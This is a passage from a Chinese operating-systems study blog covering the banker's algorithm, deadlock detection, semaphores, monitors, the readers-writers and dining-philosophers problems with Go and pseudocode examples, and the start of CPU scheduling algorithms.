Max[ i ][ j ] - Allocation[ i ][ j ]$\n银行家算法需要实现知道每个进程所需的最大资源个数\n银行家算法应用 首先需要一个算法来确定特定状态是否安全；算法会根据以下步骤确定系统的当前状态是否安全：\n⑴ Work 和 Finish 分别是长度为 m 和 n 的向量。 Work 是 available 的副本，将在分析期间进行修改。 finish 是一个布尔值的向量，表示进程是否完成 初始化时，所有 $Work=Available$ ；$Finish = false$ ⑵ 运行时，找到满足 $Finish[i] == false$；$Need[i]\u0026lt;Work[i]$；此时可以分配，如果不存在转4 ⑶ 完成时，设置 $Work = Work + Allocation[i]$，代表释放资源回到 2 ⑷ 如果所有的 $finish[ i ] == true$，则状态是安全的，因为已经完成并有安全序列 有了具体的规范，就需要看银行家算法本身如何执行，算法确定新请求是否安全，当发出请求时，对其做满足推定（假装被授予），查看结果是否安全，安全则批准，不安全则拒绝，如：\n$Request[ n ][ m ]$，代表当前请求需要的资源数，如果 $Request[ i ] \u0026gt; Need[ i ]$ 则拒绝 如果 $Request[ i ] \u0026gt; Available[i]$，那么则需要等待可用。 方法是满足推论，会检查结构是否安全，如果是，授予；如果否，则进程等待，直到请求可以被安全授予 整个过程的计算方式是：\n$Available = Available - Request$ $Allocation = Allocation + Request$ $Need = Need - Request$ Processes Allocation\nA B C Max\nA B C Available\nA B C $P_0$ 1 1 2 4 3 3 2 1 0 $P_1$ 2 1 2 3 2 2 $P_2$ 4 0 1 9 0 2 $P_3$ 0 2 0 7 5 3 $P_4$ 1 1 2 1 1 2 计算每个进程Need，列出矩阵图\n$Need = Max – Allocation$\nProcesses Allocation\nA B C Max\nA B C Available\nA B C Need\nA B C $P_0$ 1 1 2 4 3 3 2 1 0 3 2 1 $P_1$ 2 1 2 3 2 2 1 1 0 $P_2$ 4 0 1 9 0 2 5 0 1 $P_3$ 0 2 0 7 5 3 7 3 3 $P_4$ 1 1 2 1 1 2 0 0 0 这个是否安全？\n$P_0$ 需要 $(3\\ 2\\ 1)$，Available为 $(2\\ 1\\ 0)$；则 $Need \u0026lt;=Available = False$\n$P_1$ 需要 $(1\\ 1\\ 0)$，Available为 $(2\\ 1\\ 0)$；则 ==$Need \u0026lt;= Available = True$==\n$P_1$ 可以授予，执行结束后，$Available = Available +Allocation$ $(2, 1, 0) + (2, 1, 2)$ = $(4, 2, 2)$ $P_2$ 需要 $(5\\ 0\\ 1)$，Available为 $(4\\ 2\\ 2)$；则 $Need \u0026lt;=Available = False$.\n$P_3$ 需要 $(7\\ 3\\ 3)$，Available为 $(4\\ 2\\ 2)$；则 $Need \u0026lt;=Available = False$\n$P_4$ 需要 $(0\\ 0\\ 0)$，Available为 $(4\\ 2\\ 2)$；则 ==$Need \u0026lt;= Available = True$==\n$P_1$ 可以授予，执行结束后，$Available = Available +Allocation$ $(4, 2, 2) + (1, 1, 2)$ = $ (5, 3, 4)$ $P_2$ 需要 $(5\\ 0\\ 1)$，Available为 $(5\\ 3\\ 4)$；则 ==$Need \u0026lt;= Available = True$==.\n$Available = Available +Allocation$ $ (5, 3, 4) + (4, 0, 1)$ = $ (9, 3, 5) $ $P_3$ 需要 $(7\\ 3\\ 3)$，Available为 $(9\\ 3\\ 5)$；则 ==$Need \u0026lt;=Available = True$==\n$Available = Available +Allocation$ $(9, 3, 5) + (0, 2, 0) = (9, 5, 5)$ $P_0$ 需要 $(3\\ 2\\ 1)$，Available为 $(9\\ 5\\ 5)$；则 ==$Need \u0026lt;=Available = True$==\n故序列是安全的，安全序列为 $P_1, P_4, P_2, P_3, P_0$\nhttps://angom.myweb.cs.uwindsor.ca/teaching/cs330/ch7.pdf\n死锁检测 死锁检测是指如果在不能避免死锁的情况下，检测死锁何时发生，并以某些方式恢复。\n对死锁检测会对性能造成影响，除此以外，还必须有策略（算法）来从死锁中恢复，当进程必须被终止或抢占时，那进程工作会丢失\n每个资源类型单一实例 (a) 资源分配图\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;(b) 进程等待图 如图所示：等待图是资料类型的图的变种\n等待图中从 $P_i\\ →\\ P_j$ 的线表示进程 $P_i$ 正在等待进程 $P_j$ 持有的资源。 等待图中的循环表示死锁 算法必须可以做到维护一个等待图，并定期检测死锁循环 死锁检测算法 死锁检测算法与银行家算法基本相同，但有两个差别：\n银行家算法步骤一中，初始将所有 $Finish[i] = false$。而改算法仅 $Allocation[ i ] \\ne 0$，才将 $Finish[ i ] = false$。如果进程分配资源为0，则 $Finish[i] = true$。 假设如果所有其他进程都可以完成，那么这个进程也可以完成。此外，算法会寻找哪些进程涉及死锁情况，没有分配任何资源的进程不能参与死锁。 步骤2, 3 与银行家算法一致 银行家算法中，如果 $Finish[ i ] == true$ 则不存在死锁。该算法中，如果存在 $Finish[ i ] == false$ ，则检测到死锁。 如：有5个进程 $P_0$ ~ $P_4$；三种资源 $A=7$，$B=2$，$C=6$\nProcesses Allocation\nA B C Request\nA B C Available\nA B C $P_0$ 0 1 0 0 0 0 0 0 0 $P_1$ 2 0 0 2 0 2 $P_2$ 3 0 3 0 0 0 $P_3$ 2 1 1 1 0 0 $P_4$ 0 0 2 0 0 2 这个是否安全？\n$P_0$ request $(0\\ 0\\ 0)$，执行释放后\n$Available = Available +Allocation$\n$(0, 0, 0) + (0, 1, 0)$ = $(0, 1, 0)$\n$P_2$ 同 $P_0$\n$(0, 1, 0) + (0, 1, 0)$ = $(3, 1, 3)$ $P_1$ request $(2\\ 0\\ 0)$，执行释放后\n$(3, 1, 3) + (2, 0, 0)$ = $(5, 1, 3)$ $P_3$ request $(2\\ 1\\ 1)$，执行释放后\n$(5, 1, 3) + (2, 1, 1)$ = $(7, 2, 4)$ $P_4$ request $(0\\ 0\\ 2)$，执行释放后\n$(7, 2, 4) + (0, 0, 2)$ = $(7, 2, 6)$ 估是安全的\n检测算法使用 何时，使用什么样的频率来检测依赖于:\n死锁多久可能会发生？ 多少进程需要被回滚？ one for each disjoint cycle 这取决于预期死锁发生的频率，已经发生死锁后的后果，（如果发生死锁没有立即恢复，会越来越多的进程导致死锁后得不到资源阻塞）；通常情况下，常用方法：\n授予的资源分配后进行死锁检测，这样做可以立即检测到死锁；缺点是由于频繁检查死锁而导致性能下降。 仅在可能发生死锁的边缘（进程对资源的请求的边）时才进行死锁检测，这样检查频率就会很低，缺点是无法检测到原来死锁所涉及的进程，会导致死锁复杂化，恢复过程复杂 保留资源分配的历史日志定期检查死锁（如计时器、CPU资源利用率低）；通过追踪日志确定何时发生死锁以及哪些进程导致了最初的死锁 死锁恢复 通常从死锁中恢复有三种方法：\n人工干预；终止所有的死锁进程 终止一个或多个死锁进程，直到死锁消除 抢占资源 进程终止 基本可以恢复死锁的方法：\n终止所有涉及死锁的进程 一个一个的终止进程，直到死锁被消除 这种情况下，很多因素都决定接下来要终止进程的顺序： 优先级 进程运行了多久，还需多久才可完成 进程持有多少资源和什么类型的资源。 进程完成还需多少资源 需要终止多少个进程 进程是交互式的还是批处理 进程是否对任何资源进行了不可逆的更改 资源抢占 选择受害者：选择一个进程进行资源抢占，最小成本 回滚：返回到一些安全状态,重启进程到安全状态 饥饿：同一进程可能一直被选作受害者，包括回滚的数量 使用优先级系统，并在每次进程资源被抢占时增加进程的优先级。最终，获得足够高的优先级，使其不再被抢占。 ","permalink":"https://www.oomkill.com/2022/05/ch11-deadlock/","summary":"","title":"ch11 死锁"},{"content":"Backgound 信号量 semaphores，是操作系统中非常重要的技术，通过使用一个简单的整数值来管理并发进程，信号量只是一个在线程之间共享的整数变量。该变量用于解决临界区问题并实现进程同步。 信号量具有两个原子操作：\nP()：sem减一，如果sem\u0026lt;0，等待；否则继续 V()：sem加一，如果sem≤0，唤醒一个等待的P； Semaphore 信号量的使用 型号量的特点：\n两个类型信号量\n二进制信号量 Binary Semaphore：也称为互斥锁。它只能有两个值0和1。它的值被初始化为1。它用于实现多进程临界区问题的解决。\n计数信号量 Counting Semaphore：值可以跨越一个不受限制的域（可以取任何非负数）。它用于控制对具有多个实例的资源的访问。\n信号量是被保护的变量\n初始化完成后，唯一改变一个信号量的值的办法是通过P() 和 V()\n操作必须是原子\nP() 能够阻塞，V() 不会阻塞\n信号量可以用在2个方面\n互斥\n条件同步(调度约束 —— 一个线程等待另一个线程的事情发生)\n信号量实现的互斥 mutex = new Semaphore(1); mutex-\u0026gt;P(); // 临界区前p ... critical section ... mutex-\u0026gt;V(); // 临界区后v 信号量实现调度约束 condition = new Semaphore(0); // Thread A ... condition-\u0026gt;P(); // 等待线程B某一些指令完成之后再继续运行,在此阻塞 ... // Thread B ... condition-\u0026gt;V(); // 线程b执行某程度后，使用信号量增加唤醒线程A 信号量实现有界缓冲 在更复杂的同步场景下，用二进制信号量无法有效的解决问题，此时就需要计数信号量来完成这些功能；例如一个线程等待另一个线程处理事情\n比如生产东西或消费东西(生产者消费者模式)，互斥(锁机制)是不够的\n有界缓冲区的生产者-消费者问题\n一个或者多个生产者产生数据将数据放在一个缓冲区里 单个消费者每次从缓冲区取出数据 在任何一个时间只有一个生产者或消费者可以访问该缓冲区 在这里需要注意一些问题：\n正确性要求\n在任何一个时间只能有一个线程操作缓冲区(互斥)；可多个\n当缓冲区为空时，消费者必须等待生产者(调度，同步约束)\n当缓存区满，生产者必须等待消费者(调度，同步约束)\n每个约束用一个单独的信号量\n一个二进制信号量，互斥 两个计数信号量 一般信号量 fullBuffers 一般信号了 emptyBuffers class BoundedBuffer{ mutex = new Semaphore(1); fullBuffers = new Semaphore(0); //说明缓冲区初始为空 emptyBuffers = new Semaphore(n); //同时可以有n个生产者来生产 }; // 生产者 BoundedBuffer::Deposit(c){ emptyBuffers-\u0026gt;P(); // emptyBuff 操作 -1，当EB被阻塞时， mutex-\u0026gt;P(); // 操作buffer时，是互斥操作，需要使用pv Add c to the buffer; // 临界区 mutex-\u0026gt;V();\t// 操作buffer时，是互斥操作，需要使用pv fullBuffers-\u0026gt;V(); // FB初始值为0，通过通知机制可以通知消费者可以开始取数据 } // 消费者 BoundedBuffer::Withdraw(c){ // 消费者先执行，此时BF为0 会阻塞，等待先写后读 // 生产者先执行，初始FB为0，+1 此时会读取数据 fullBuffers-\u0026gt;P(); mutex-\u0026gt;P(); // 操作buffer时，是互斥操作，需要使用pv Remove c from buffer; // 临界区 mutex-\u0026gt;V();\t// 操作buffer时，是互斥操作，需要使用pv emptyBuffers-\u0026gt;V(); // 消费后会+1，使得EB不满，起到通知生产者继续写数据 } 管程 管程是一种解决进程间同步问题的程序结构，英文是 Monitors；管程通过编程语言级别的支持，实现进程间的互斥。管程包含了一些列共享变量，以及针对变量的共享函数的组合，在设计上管程定义了：\n锁 用锁来确保在任何情况下监视器中只有一个进程。 对共享数据提供互斥 0或者多个条件变量，用于管理对共享数据的并发访问 通过使进程进入睡眠状态的同时释放它们的锁，使线程在临界区内进入睡眠状态。 如下图所示：monitor是一种数据结构，用于将所有控制信息、时间信息和共享数据封装为一个整体。这个整体是对信号量的抽象，可以在其中定义互斥的控制语句。\n进入管程需要有队列（entry queue），是互斥的，首先要获得lock\n进入临界区后，执行函数对共享变量进行操作，这是在条件变量中\nlock\nLock::Acquire() 等待直到锁可用,然后抢占锁 Lock::Release() 释放锁,唤醒等待者如果有 Condition Variable\n允许等待状态进入临界区 允许处于等待(睡眠)的线程进入临界区 某个时刻原子释放锁进入睡眠 Wait() operation 暂停对任何条件变量执行等待操作的进程。挂起的进程被放置在该条件变量的块队列中。 Signal() operation(or broadcast() operation) 唤醒等待的进程，需要进程存在 class Condition{ int numWaiting = 0; WaitQueue q; }; Condition::Wait(lock){ numWaiting++; Add this thread t to q; release(lock); schedule(); // 选择下一个进程执行，选择就绪进程执行 require(lock); } Condition::Signal(){ if(numWaiting \u0026gt; 0){ Remove a thread t from q; wakeup(t); // 唤醒进程，将睡眠进程置为就绪状态 numWaiting--; } } 使用monitor，抽象出一个管程，并用word满足管程的锁和条件变量，word将计时器和控制信息聚合了，只有初始化时的结构才能获得锁：\n**Wait() **：如果定义了成员变量，则等待函数获取互斥锁 **Signal() **：释放获取的锁，以便其他线程可以获取它。 package main import ( \u0026quot;fmt\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;strconv\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; ) // 一个管程 type Monitor interface { Wait() Signal() GetData() []string // 返回整个数组， PutData(string) //原子操作 } // 管程的实现 type Words struct { mutex *sync.Mutex wordsArray []string isInitialized bool } func (m *Words) Wait(p int) { if m.isInitialized { fmt.Printf(\u0026quot;process %d got a lock\\n\u0026quot;, p) m.mutex.Lock() } fmt.Printf(\u0026quot;process %d not get a lock\\n\u0026quot;, p) } func (m *Words) Signal(p int) { if m.isInitialized { fmt.Printf(\u0026quot;process %d release a lock\\n\u0026quot;, p) m.mutex.Unlock() } } func (m *Words) GetData() []string { return m.wordsArray } func (m *Words) PutData(word string, pn int) { m.Wait(pn) fmt.Printf(\u0026quot;start process %d \\n\u0026quot;, pn) // critical section m.wordsArray = append(m.wordsArray, word) time.Sleep(time.Millisecond * time.Duration(rand.Intn(800))) // critical section done fmt.Printf(\u0026quot;process %d done.\\n\u0026quot;, pn) m.Signal(pn) } func (m *Words) Init() { m.mutex = \u0026amp;sync.Mutex{} m.wordsArray = []string{} m.isInitialized = true } func main() { m := \u0026amp;Words{} m.Init() wg := \u0026amp;sync.WaitGroup{} wg.Add(10) for n := 0; n \u0026lt; 10; n++ { go func(i int) { defer wg.Done() m.PutData(\u0026quot;Angad\u0026quot;+strconv.Itoa(rand.Intn(100000)), i) }(n) } wg.Wait() fmt.Println(m.GetData()) } Reference\nmonitor types\nmonitor implement\nhttps://www.cs.utexas.edu/users/lorenzo/corsi/cs372h/07S/notes/Lecture12.pdf\nhttps://medium.com/algorithm-solving/os-synchronization-2-semaphore-and-classical-problems-of-synchronization-fdbbcb027b79\nquestion of synchronize Readers-Writers问题 Readers-Writers Problem 是允许多个进程读临界区，多个写者修改临界区；该问题的约束:\n允许同一时间有多个读者，但在任何时候只有一个写者 没有写者时，读者才能访问数据 没有读者和写者时，写者才能访问数据 在任何时候只能有一个线程可以操作共享变量 读进程\nwait(mutex); // 修改计数器，因为保证计数器互斥，需要加锁 rc++; if (rc == 1) wait(wrt); // 保证不会有写进入 signal(mutex); // critical section // critical section END wait(mutex); // release rc rc--; if (rc == 0) // 计数器为0则代表已经无读进程， signal (wrt); // 释放读写锁 signal(mutex); 上面代码 mutex 和 wrt 是信号量，rc 是读进程计数器，初始化时为0\n写进程\nwait(wrt); // critical section signal(wrt); 基于管程的实现\nAR = 0; // # 活跃的读者进程 AW = 0; // # 活跃的写者进程 WR = 0; // # 等待的读者进程 WW = 0; // # 等待的写者进程 Condition okToRead; Condition okToWrite; Lock lock; //writer Public Database::Write(){ //Wait until no readers/writers; StartWrite(); write database; //check out - wake up waiting readers/writers; DoneWrite(); } Private Database::StartWrite(){ lock.Acquire(); // 写优先，存在任意读 写进程都将被阻塞直到满足条件 while((AW + AR) \u0026gt; 0){ WW++; okToWrite.wait(\u0026amp;lock); WW--;\t} AW++; lock.Release(); } Private Database::DoneWrite(){ lock.Acquire(); AW--; if(WW \u0026gt; 0){ okToWrite.signal(); // signal是唤醒一个 } else if(WR \u0026gt; 0){ okToRead.broadcast(); // broadcase是唤醒所有 } lock.Release(); } //reader Public Database::Read(){ //Wait until no writers; StartRead(); read database; //check out - wake up waiting writers; DoneRead(); } Private Database::StartRead(){ lock.Acquire(); while(AW + WW \u0026gt; 0){ //关注等待的writer,体现出写者优先 WR++; okToRead.wait(\u0026amp;lock); WR--; } AR++; lock.Release(); } private Database::DoneRead(){ lock.Acquire(); AR--; if(AR == 0 \u0026amp;\u0026amp; WW \u0026gt; 0){ //只有读者全部没有了,才需要唤醒 okToWrite.signal(); } lock.Release(); } 其他实现方式\n通常情况下为了保证读写问题，一般会通过互斥或信号量来实现。然而，go中提供了读写锁 sync.RWMutex 是为了解决这个问题的一种数据结构。\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; ) var mutex = new(sync.RWMutex) var cs = []string{} func writer(data string) { mutex.Lock() defer mutex.Unlock() cs = append(cs, fmt.Sprintf(\u0026quot;updated with %s\u0026quot;, data)) // Write to data. } func reader(data string) { fmt.Printf(\u0026quot;%s start execute.\\n\u0026quot;, data) mutex.RLock() defer mutex.RUnlock() fmt.Println(cs) time.Sleep(time.Millisecond * time.Duration(rand.Intn(800))) // Read from data. } func main() { wg := \u0026amp;sync.WaitGroup{} wg.Add(12) for i := 0; i \u0026lt; 2; i++ { go func(i int) { go writer(fmt.Sprintf(\u0026quot;writer thread %d\u0026quot;, i)) wg.Done() time.Sleep(time.Millisecond * time.Duration(rand.Intn(800))) }(i) } for i := 0; i \u0026lt; 10; i++ { go func(i int) { reader(fmt.Sprintf(\u0026quot;reader thread %d\u0026quot;, i)) wg.Done() }(i) } wg.Wait() } 哲学家就餐问题 哲学家就餐问题 dining philosophers problem；有五位哲学家，餐厅中间是一张圆桌，但只有五根筷子，每次吃饭需要两根筷子；当哲学家饿了就会拿起离自己最近的两根筷子；如果可以同时拿起离自己最近的两根筷子吃饭，吃完饭后，放下筷子思考。\n如何设计 如图所示首先，哲学家们处于的状态 思考\u0026mdash;\u0026mdash;拿筷子\u0026mdash;\u0026mdash;吃饭\u0026mdash;\u0026mdash;放下筷子\u0026mdash;\u0026mdash;思考的状态中变化。\n吃就是对临界区的访问，而如何拿筷子才是重点问题，而筷子则是 整个问题中的 Race Condition；可以将每根筷子互斥锁保护的共享对象，而在吃饭前，对其左右筷子进行加锁，两把锁都加成功，视为可以吃饭（访问临界区），吃完饭解锁筷子，进行思考\n共享数据有：\nBowl of rice(data set) Semaphone chopsticks [5] initialized to 1 步骤：\nthink(): pickUpChopsticks()： eating() PutDownChopsticks() #define N 5 // 哲学家数量 void philosopher(int i) { // 哲学家编号 while(TRUE) { think();\t// 思考 PickUpChopsticks(i); // 拿起左边的筷子 PickUpChopsticks((i+1)%N); // 拿起右边的筷子，筷子保证不大于哲学家数量 eat();\t// 吃饭 PutDownChopsti(i);\t// 放下左边的筷子 PutDownChopsti((i+1)%N); // 放下右边的筷子 } } 这样在哪左边筷子完成时，再拿右边筷子时发现都被占用拿不到，而又不满足吃饭条件，导致死锁。为了防止死锁问题需要进一步的判断\n#define N 5 // 哲学家数量 void philosopher(int i) { // 哲学家编号 while(TRUE) { think();\t// 思考 PickUpChopsticks(i); // 拿起左边的筷子 if (chopsticks((i+1)%N)){ PickUpChopsticks((i+1)%N); // 拿起右边的筷子，筷子保证不大于哲学家数量 break; } else { // 不存在则放下左边筷子，并阻塞 PutDownChopsti(i);\t// 放下左边的筷子 wait() } eat();\t// 吃饭 PutDownChopsti(i);\t// 放下左边的筷子 PutDownChopsti((i+1)%N); // 放下右边的筷子 } } 互斥访问，可以解决但是同时只能一个哲学家就餐；这里将就餐看为临界区，而不是筷子，会造成筷子资源的浪费\n#define N 5 // 哲学家数量 void philosopher(int i) { // 哲学家编号 while(TRUE) { p(mutex) think();\t// 思考 PickUpChopsticks(i); // 拿起左边的筷子 PickUpChopsticks((i+1)%N); // 拿起右边的筷子，筷子保证不大于哲学家数量 eat();\t// 吃饭 PutDownChopsticks(i);\t// 放下左边的筷子 PutDownChopsticks((i+1)%N); // 放下右边的筷子 v(mutex) } } 为了防止死锁的发生，可以设置两个条件：\n必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 这种就诞生了一个原则：要么不拿，要么拿两个： step1：thinking step2：Hungry step3：左右邻居正在就餐则等待，否则下一步 step4：拿起两个筷子 step5：eating step6：方向左边筷子 step7：方下右边筷子 step8：to step1 #define N 5 // 哲学家数量 #define LEFT (i + N - 1) % N // 左邻居 #define RIGHT (i + 1) % N // 右邻居 #define THINKING 0 #define HUNGRY 1 #define EATING 2 typedef int semaphore; int state[N]; // 跟踪每个哲学家的状态 semaphore mutex = 1; // 临界区的互斥，临界区是 state 数组，对其修改需要互斥 semaphore s[N]; // 同步信号量，每个哲学家一个信号量 void philosopher(int i) { while(TRUE) { think(i); // step1 take_two(i); // step2~4 eat(i);\t// step5 put_two(i); // step6~7 } } void take_two(int i) { P(\u0026amp;mutex); state[i] = HUNGRY; // 饿了 checkChopsticks(i); // 拿筷子 V(\u0026amp;mutex); // 离开临界区 P(\u0026amp;state[i]); // } void put_two(i) { P(\u0026amp;mutex); state[i] = THINKING; // 尝试通知左右邻居，自己吃完了，你们可以开始吃了 checkChopsticks(LEFT); checkChopsticks(RIGHT); V(\u0026amp;mutex); } void eat(int i) { down(\u0026amp;mutex); state[i] = EATING; up(\u0026amp;mutex); } // 检查两个邻居是否都没有用餐，如果是的话，就 up(\u0026amp;s[i])，使得 down(\u0026amp;s[i]) 能够得到通知并继续执行 void checkChopsticks(i) { // 第一个，当前哲学家饿了 // 左边和右边都没有在吃饭 if(state[i] == HUNGRY \u0026amp;\u0026amp; state[LEFT] != EATING \u0026amp;\u0026amp; state[RIGHT] !=EATING) { state[i] = EATING; V(\u0026amp;s[i]); } } 具体的实现：\npackage main import ( \u0026quot;log\u0026quot; \u0026quot;math/rand\u0026quot; \u0026quot;sync\u0026quot; \u0026quot;time\u0026quot; ) const ( THINKING = iota HUNGRY EATING ) type chopstick struct { sync.Mutex } type Philosopher struct { Id int Left *chopstick Right *chopstick State int } func init() { log.SetFlags(log.Ldate | log.Lmicroseconds | log.Lshortfile) } // 哲学家 var ph = []string{\u0026quot;Mark\u0026quot;, \u0026quot;Russell\u0026quot;, \u0026quot;Rocky\u0026quot;, \u0026quot;Haris\u0026quot;, \u0026quot;Root\u0026quot;} // 同时可以吃饭的哲学家数量 var host = make(chan int, int(len(ph)/2)) var wg sync.WaitGroup func (p *Philosopher) think() { log.Printf(\u0026quot;Philosopher %s start thinging.\\n\u0026quot;, ph[p.Id]) time.Sleep(time.Millisecond * time.Duration(rand.Intn(1000))) } func (p *Philosopher) hungry() { log.Printf(\u0026quot;Philosopher %s has hungry.\\n\u0026quot;, ph[p.Id]) time.Sleep(time.Millisecond * time.Duration(rand.Intn(500))) } func (p *Philosopher) pickUpChopsticks() { // 两个筷子被锁，则阻塞 p.Left.Lock() p.Right.Lock() log.Printf(\u0026quot;Philosopher %s pick up two chopsticks.\\n\u0026quot;, ph[p.Id]) } func (p *Philosopher) eating() { // 有两个哲学家在吃，阻塞 host \u0026lt;- p.Id p.State = EATING p.pickUpChopsticks() log.Printf(\u0026quot;Philosopher %s begin eating.\\n\u0026quot;, ph[p.Id]) time.Sleep(time.Millisecond * time.Duration(rand.Intn(10000))) p.putDonwChopsticks() \u0026lt;-host } func (p *Philosopher) putDonwChopsticks() { p.Left.Unlock() p.Right.Unlock() log.Printf(\u0026quot;Philosopher %s put down two chopsticks.\\n\u0026quot;, ph[p.Id]) } func (p *Philosopher) seat() { for n := 0; n \u0026lt; 3; n++ { p.think() p.hungry() p.eating() } wg.Done() } func main() { // 创建五根筷子 ChopSticks := make([]*chopstick, 5) for i := 0; i \u0026lt; 5; i++ { ChopSticks[i] = new(chopstick) } // 创建五个哲学家 philosophers := make([]*Philosopher, len(ph)) for n := 0; n \u0026lt; len(ph); n++ { philosophers[n] = \u0026amp;Philosopher{ Id: n, Left: ChopSticks[n], Right: ChopSticks[(n+1)%len(ph)], State: THINKING, } } // 哲学家就坐 for i := 0; i \u0026lt; 5; i++ { wg.Add(1) go philosophers[i].seat() } wg.Wait() } 可以从执行结果看到，同时满足左右筷子都可以拿起的哲学家才可以进程吃\nReference\nread-write problom\nDining Philosophers Problem\n","permalink":"https://www.oomkill.com/2022/05/ch10-semaphore-and-monitors/","summary":"","title":"ch10 信号量和监视器"},{"content":"Overview CPU调度 (cpu scheduling )，是决定在一个时间窗口内，哪个进程可以拥有CPU而另外一个个进程会被暂停的过程。CPU调度的作用是为了确保每当CPU空闲时，操作系统至少选择就绪队列中一个可用的进程执行。这个选择过程将由CPU调度器来执行。\n调度程序：挑选就绪进程的内核函数\n调度策略：依据什么挑选进程？ 调度时机：什么时间进行调度？ 进程从运行状态切换到等待状态 进程退出 非抢占式：当前进程主从放弃CPU时， 抢占式：当前进程被抢占 时间片用完 进程从等待切换到就绪（当前就绪进程优先级高于当前运行进程） 调度准则 CPU的调度策略 抢占式调度 抢占式调度（Preemptive）在分配进程时有对应的优先级。而在另一个较低优先级进程之前运行具有较高优先级的进程很重要，即使较低优先级的进程仍在运行。较低优先级的进程扔会等待一段时间，让较高优先级的进程完成执行后恢复。\n抢占式调度主要发生在运行状态切换到就绪或等待状态\n非抢占式调度 非抢占式调度 （Non-Preemptive），在这种类型的调度中，一旦将资源（CPU 周期）分配给一个进程，该进程就会持有CPU使用权，直到它被终止或达到等待状态。\n抢占式调度主要发生在运行状态终止的情况下\n如何确定调度是抢占式还是非抢占式？ 一般来讲，确定调度的方式是通过以下四点来确定的：\n当进程从运行状态切换到等待状态；如I/O请求或调用 wait() 系统调用 当进程从运行状态切换到就绪状态；如响应中断。 当进程从等待状态切换到就绪状态；如在 I/O 完成或从 wait() 返回时。 进程完成执行并终止； 如果调度发生在1 4情况下，则为非抢占式，否则为抢占式\n程序执行模型 需要关注的是进程在计算机系统中运行时存在什么状态？\n几乎所有进程都在一个连续的循环的两种模型之间交替：即CPU突发和I/O突发中交替\n每个调度决定都是关于在下一个CPU突发时将哪个工作交给CPU 在时间分片机制下，线程可能在结束当前CPU突发前被迫放弃CPU CPU突发和 I/O突发的交替序列逻辑\rCPU 突发型的持续时间\r调度指标 在了解评价指标前，需要对CPU调度中的一些术语需要了解\nCPU突发 （Burst Time BT）：进程开始执行的时间，从到达到开始执行花费的时间 到达时间 （Arrival Time AT）：进程到达就绪队列的时间 完成时间（End Time ET 或 Completion Time CT）：进程执行完成的时间 等待时间 （Waiting Time WT）：进程在就绪队列中等待轮到 CPU 占用的时间；$WT = TT - BT$ 周转时间 （Turnaround Time TT）：完成时间和到达时间的差 $TT=CT-AT$ 相应时间（Response Time RT）：开始响应请求所需的时间。第一次请求到相应的时间。 吞吐量 (Throughput)：单位时间内完成的进程数。$Throughput = (Number\\ of\\ processes\\ completed) \\div (Time\\ unit)$ 一般情况下，需要的服务”越快“越好，而快的定义：\n传输文件的高带宽（相应时间） 玩游戏的低延迟（吞吐量） 上述两个因素是互相独立的 需要对低延迟和高带宽做一个平衡\n比较算法的准则 相应时间目标：通过低延迟的调度改善用户的交互体验 减少相应的时间：及时处理用户的输出并且尽快将输出提供给用户 减少平均相应时间的波动：在交互式系统中，可预测性比高差异低平均更重要 相应时间是操作系统的计算延迟 吞吐量目标：操作系统应该保证吞吐量不受用户交互的影响 增加吞吐量，增加系统吞吐量大概可以从两个角度来提出 减少开销（上下文切换） 系统资源的高效利用（CPU，I/O） 减少等待时间 吞吐量是操作系统的计算带宽 公平的目标 在整个操作系统进程管理中的调度挑战在于如何使整个系统尽可能地“高效”与“公平”（efficient\u0026quot; and fair），这受制于不断变化且通常是在动态的条件下，而“高效”和“公平”在某种程度上是主观的，经常会受到不断变化的抢先策略而被影响。\n而公平的定义是可以让每个进程等待相同的时间，如：\n保证每个进程占用相同CPU的时间 如果一个用户比其他用户运行更多的进程的情况下该如何处理？ 而保证公平带来的则通常会增加平均的相应时间\n调度算法 基本调度算法 先到先服务 先来先服务 (First Come First Serve FCFS)，是最简单的调度算法，FCFS是根据进程的到达时间进行调度；即表示，先请求 CPU 的进程先分配CPU。它是通过使用FIFO 队列来实现的。当一个进程进入就绪队列时，该进程的 PCB 会被放置到队列的尾部。当CPU空闲时，会将队列头部。然后从队列中删除正在运行的进程。FCFS 是一种非抢占式调度算法。\n实例：假设有三个进程按以下顺序到达：P1 , P2, P3；CPU突发时间为 24 3 3\nProcess Burst Time P1 24 P2 3 P3 3 那么对应的甘特图是：\n那么衡量指标的信息如：\r等待时间WT为：P1=0；P2=24；P3=27 平均相应AT时间为: $(0 + 24 + 27)\\div3 = 17$ 这里存在一个问题，如果第一个进程执行时间过长，会导致后面所有的进程等待时间过长，这样会拖长整个队列的平均相应时间。这种现象被称为护航效应 （Convoy Effect）。\n护航效应，在调度算法中当CPU密集型（CPU-bound）进程在 I/O密集型（ I/O-bound）进程之前到达系统时，即使 I/O密集型进程需要较少的CPU时间，此时CPU密集型进程也会根据FCFS的策略而获得CPU时间。\n护航效应类比图\r为了更有效的避免护航效应，可以使用抢占式的调度算法，如RR；抢占式调度算法可以使每个进程都有相同的机会使用CPU。而这些较小的进程占用很短的CPU时间，而不必等待很长的CPU时间，从而加快执行速度并减少闲置资源。\n例如假设执行顺序按照：P2 , P3, P1，那么整个的执行队列如下图\n此时平局等待时间WT为： P1 = 6;P2 = 0; P3 = 3\n平均等待时间为：$(6 + 0 + 3)\\div3 = 3$\n缺点:\n平均等待时间波动较大 花费时间少的任务可能排在花费时间长的任务后面 可能导致IO和CPU之间的重叠处理(CPU密集型进程会导致IO设备闲置时，IO密集型进程也在等待) 最短作业优先 最短作业优先 （Shortest Job First SJF），是一种非抢占式的调度算法，SJF会首先调度具有最短CPU Brust的进程。如果两个进程具有相同的BT，则使用FCFS来打破平局。其特点为：\n对每个进程关联其下一个CPU Brust的大小，使用这些长度来排序以最短会被优先调度 SJF最大的优势是，给定一组进程的最短平均等待时间 AT SJF难度在于如何知道下一个 CPU请求的长度 如：假设有三个进程按以下顺序到达：P1 , P2, P3，P4；CPU突发时间为 6 8 7 3，将其排好序后如图\nProcess Burst Time P1 6 P2 8 P3 7 P4 3 gantt\rdateFormat YYYY-MM-DD\raxisFormat %S\rtitle SJF scheduling chart\rP4 :p1, 2014-01-01, 3s\rP1 :p2, after p1, 6s\rP3 :p3, after p2, 7s\rP2 :p4, after p3, 